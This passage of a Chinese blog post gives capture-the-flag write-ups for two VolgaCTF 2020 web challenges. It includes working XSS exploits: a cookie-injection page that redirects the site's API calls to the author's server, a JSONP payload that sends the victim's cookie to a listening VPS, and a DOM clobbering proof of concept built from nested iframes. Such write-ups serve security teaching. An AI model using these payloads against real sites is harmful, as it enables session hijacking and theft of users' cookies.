+<p>在一段代码中我们可以看出来api变量的赋值时通过cookie进行的，在第二段getUser函数中子域名是通过api变量去确认的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&#96;&#x2F;&#x2F;$&#123;api&#125;.volgactf-task.ru&#x2F;user?guid&#x3D;$&#123;guid&#125;...</span><br></pre></td></tr></table></figure>
+
+<p>但是在可控制api变量的情况下我们实际上是可以控制请求的网址的。比如另api为exploit.lihuaiqiu.top?，那么实际请求的URL为<a href="https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}</a> 即可控制请求的网址，但是在main.js有这样一个过滤函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function replaceForbiden(str) &#123;</span><br><span class="line">    return str</span><br><span class="line">        .replace(&#x2F;[ !&quot;#$%&amp;Вґ()*+,\-\&#x2F;:;&lt;&#x3D;&gt;?@\[\\\]^_&#96;&#123;|&#125;~]&#x2F;g, &quot;&quot;)</span><br><span class="line">        .replace(&#x2F;[^\x00-\x7F]&#x2F;g, &quot;?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里对?进行替空 并且对\x00-\x7F换成?..所以直接用\x00-\x7F间的字符bypass一下就可以了</p>
+<p>最后我们需要通过getJSON函数来触发xss.简单的看一下介绍：</p>
+<p><img src="https://s1.ax1x.com/2020/03/31/GQfyDI.png" alt="GQfyDI.png"></p>
+<p>本地简单试一下</p>
+<p>在我们的网站放入xss语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&quot;xss&quot;:alert(1)&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>调用getJSON函数，成功触发xss</p>
+<p><img src="https://s1.ax1x.com/2020/03/31/GQhIJO.png" alt="GQhIJO.png"></p>
+<p>所以这里我们只需要将参数控制为?即可xss，回到之前的代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    data</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">        location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        profile(data.user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"/"</span>,</span><br><span class="line">        <span class="string">"/index.html"</span>,</span><br><span class="line">        <span class="string">"/profile.html"</span>,</span><br><span class="line">        <span class="string">"/report.php"</span>,</span><br><span class="line">        <span class="string">"/editprofile.html"</span></span><br><span class="line">    ].includes(location.pathname)</span><br><span class="line">) &#123;</span><br><span class="line">    getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过上面代码 可分析得在path有上面数组中的任意一个，将传第guid参数给getUser，那我们只要给guid一个?就可以了</p>
+<p>最终exp</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">"api_server=exploit.lihuaiqiu.top\x77; domain=volgactf-task.ru;"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">'https://volgactf-task.ru/report.php?guid=?'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<a href="https://exploit.lihuaiqiu.top放上构造好的xss语句" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top放上构造好的xss语句</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;<span class="string">"test"</span>:<span class="built_in">window</span>.location=<span class="string">'vps'</span>+<span class="built_in">document</span>.location&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>自己vps监听下即可收到cookie</p>
+<p><img src="https://s1.ax1x.com/2020/03/31/Gl8ggJ.png" alt="Gl8ggJ.png"></p>
+<p>当然还有另一种更有趣的回调操作</p>
+<p>俄罗斯带哥找到了回溯的正则表达，膜，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;  1.7.2 &#x2F;(&#x3D;)\?(?&#x3D;&amp;|$)|\?\?&#x2F;</span><br><span class="line">&lt;&#x3D; 1.7.2 &#x2F;(\&#x3D;)\?(&amp;|$)|\?\?&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.5.1 &#x2F;(\&#x3D;)\?(&amp;|$)|()\?\?()&#x2F;i</span><br><span class="line">&lt;&#x3D; 1.4.4 &#x2F;\&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.4.2 &#x2F;&#x3D;\?(&amp;|$)&#x2F;</span><br><span class="line">&lt;&#x3D; 1.2.1 &#x2F;&#x3D;(\?|%3F)&#x2F;g</span><br><span class="line">&lt;  1.2   not supported</span><br></pre></td></tr></table></figure>
+
+<p>所以我们完全可以不用考虑guid的传值，直接进行回调，并且??后面是可以接受任意其他字符的，如下：</p>
+<p><img src="https://s1.ax1x.com/2020/04/01/GldVl8.png" alt="GldVl8.png"></p>
+<p>都可成功回调</p>
+<h3 id="VolgaCTF-Archive"><a href="#VolgaCTF-Archive" class="headerlink" title="VolgaCTF Archive"></a>VolgaCTF Archive</h3><p>蛮有趣的一道题</p>
+<p>主要代码如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/pages.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="built_in">window</span>).on(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line">    volgactf.activePage.location=location.hash.slice(1);</span><br><span class="line">    if(volgactf.pages[volgactf.activePage.location]) &#123;</span><br><span class="line"><span class="javascript">      $(<span class="string">'#page'</span>).attr(<span class="string">'src'</span>,volgactf.pages[volgactf.activePage.location]);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.active'</span>).removeClass(<span class="string">'active'</span>);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">'.nav-item &gt; a:contains('</span>+volgactf.activePage.location+<span class="string">')'</span>).addClass(<span class="string">'active'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="javascript">  $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span>(location.hash.slice(<span class="number">1</span>) != <span class="string">'2019'</span>) &#123;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">window</span>).trigger(<span class="string">'hashchange'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>page.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">volgactf = &#123;</span><br><span class="line">pages: &#123;</span><br><span class="line"><span class="string">'2011'</span>: <span class="string">'./html/2011.html'</span>,</span><br><span class="line"><span class="string">'2012'</span>: <span class="string">'./html/2012.html'</span>,</span><br><span class="line"><span class="string">'2013'</span>: <span class="string">'./html/2013.html'</span>,</span><br><span class="line"><span class="string">'2014'</span>: <span class="string">'./html/2014.html'</span>,</span><br><span class="line"><span class="string">'2015'</span>: <span class="string">'./html/2015.html'</span>,</span><br><span class="line"><span class="string">'2016'</span>: <span class="string">'./html/2016.html'</span>,</span><br><span class="line"><span class="string">'2017'</span>: <span class="string">'./html/2017.html'</span>,</span><br><span class="line"><span class="string">'2018'</span>: <span class="string">'./html/2018.html'</span>,</span><br><span class="line"><span class="string">'2019'</span>: <span class="string">'./html/2019.html'</span></span><br><span class="line">&#125;,</span><br><span class="line">activePage: &#123;</span><br><span class="line">location: <span class="number">2019</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>主要代码逻辑就是通过对page.js的加载更改location.hash切换页面</p>
+<p>如果我们可以将 volgactf.activePage.location的值替换为javascript:alert(1)的话，即可造成xss攻击</p>
+<p>所以目前要做的就是将volgactf.active覆盖为一个window对象，对于覆盖的实现可以使用Dom clobbering进行覆盖，不过volgactf.active在题目中已经是一个被声明的变量了，我们需要使这个变量变成未定义的状态，在旧版本的chrome中可以通过xss-auditor进行变量移除，不过在新版本中已经被删掉了。</p>
+<p>但是在这个题目中可以通过另外的方式使得此变量变成未定义的模式，此变量的获取是通过page.js进行变量赋值的，我们可以通过一些手段使得Page.js无法成功加载达到此目的</p>
+<p>大概有两种方法，如下：</p>
+<ul>
+<li>Nginx与浏览器的解析差异问题</li>
+</ul>
+<p>对于<a href="https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F来讲，如果Nginx进行解析的话，实际上请求的是https://archive.q.2020.volgactf.ru，但是浏览器并不会对%2F进行解码，会将其视作文件，所以最后通过script调用page.js实际产生的是https://archive.q.2020.volgactf.ru/x/js/page.js，进一步可成功得到未定义的volgactf.activePage</a></p>
+<ul>
+<li>通过斜线构造超长URL</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;              200 OK</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;archive.q.2020.volgactf.ru&#x2F;&#x2F;&#x2F;&#x2F;[.....]&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;js&#x2F;main.js    414 Request-URI Too Large</span><br></pre></td></tr></table></figure>
+
+<p>触发414，同样无法成功加载page.js，进而得到未定义的volgactf.activePage</p>
+<p>回归本体的攻击思路</p>
+<ul>
+<li>首先通过iframe引入<a href="https://archive.q.2020.volgactf.ru/x/..%2F（子页面）" target="_blank" rel="noopener">https://archive.q.2020.volgactf.ru/x/..%2F（子页面）</a></li>
+<li>构造frames[0].frames[0].location构造孙页面</li>
+<li>孙页面的iframe设置name为activePage,并且将此页面的window.name设置为volgactf，此时相当于成功污染子页面的volgactf变量，最后将volgactf.activePage设置为与题目同域的window对象</li>
+</ul>
+<p>最后的利用Poc如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">  frames[<span class="number">0</span>].frames[<span class="number">0</span>].location=<span class="string">'data:text/html;base64,PGlmcmFtZSBuYW1lPWFjdGl2ZVBhZ2Ugc3JjPWh0dHBzOi8vYXJjaGl2ZS5xLjIwMjAudm9sZ2FjdGYucnUvP2FhYT48L2lmcmFtZT48c2NyaXB0PndpbmRvdy5uYW1lPSd2b2xnYWN0Zic7PC9zY3JpcHQ+'</span>;</span></span><br><span class="line"><span class="actionscript">  setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;frames[<span class="number">0</span>].location=<span class="string">'https://archive.q.2020.volgactf.ru/x/..%2f#javascript:alert(document.domain)'</span>&#125;,<span class="number">1000</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/15/DOM-Clobbering-Attack/" rel="next" title="DOM Clobbering Attack">
+                <i class="fa fa-chevron-left"></i> DOM Clobbering Attack
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/12/intigriti-Easter-XSS-challenge/" rel="prev" title="intigriti Easter XSS challenge">
+                intigriti Easter XSS challenge <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#UserCenter"><span class="nav-number">1.</span> <span class="nav-text">UserCenter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VolgaCTF-Archive"><span class="nav-number">2.</span> <span class="nav-text">VolgaCTF Archive</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
